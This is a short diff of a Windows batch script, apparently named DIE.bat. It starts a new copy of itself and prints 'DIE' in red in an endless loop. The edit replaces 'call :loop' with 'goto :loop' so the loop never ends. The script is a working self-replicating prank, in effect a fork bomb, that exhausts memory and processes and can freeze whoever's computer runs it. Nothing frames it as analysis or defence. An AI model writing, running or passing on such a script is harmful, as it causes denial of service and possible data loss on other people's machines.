@@ -1,9 +1,9 @@
 @echo OFF
 start DIE.bat
-call :loop
+goto :loop
 
 
 :loop
 color cf
 echo DIE DIE DIE DIE DIE DIE DIE DIE DIE DIE DIE DIE DIE DIE DIE DIE 
-call :loop
+goto :loop
